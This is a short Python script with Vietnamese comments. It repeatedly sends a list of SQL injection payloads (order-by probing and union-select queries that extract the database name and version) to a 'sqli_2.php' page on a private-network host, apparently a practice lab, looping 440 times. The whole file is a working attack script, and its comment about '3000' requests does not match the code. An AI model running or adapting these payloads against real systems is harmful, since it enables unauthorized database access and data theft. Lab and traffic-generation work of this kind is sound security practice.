import requests
import time

# Danh sách các URL để thực hiện request
urls = [
    'http://192.168.10.10:80/sqli_2.php?movie=1 order by 1-- &action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,2,3,4,5,6,7--&action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,database(),3,4,5,6,7--&action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,version(),3,4,5,6,7--&action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=1 and 1=0 union all select 1,version(),@@version,4,5,6,7--&action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=3%20order%20by%207%20&action=go',
    'http://192.168.10.10:80/sqli_2.php?movie=3%20AND%201=0%20union%20select%201,@@version,3,4,5,6,7%20&action=go',
    "http://192.168.10.10:80/sqli_2.php?movie=2' and 1=2 -- &action=go"
]

# Số lượng request muốn thực hiện, 500*6 = 3000 url
num_requests = 440

# Hàm gửi request đến từng URL
def send_requests():
    for i in range(num_requests):
        for url in urls:
            try:
                response = requests.get(url)
                print(f"Request {i+1} : thanh cong")
            except Exception as e:
                print(f"request {i+1} : that bai")
        # Thêm delay giữa các request nếu cần (giảm tải cho server)
        time.sleep(0.8)  # Tùy chỉnh thời gian delay nếu cần

# Bắt đầu thực hiện requests
send_requests()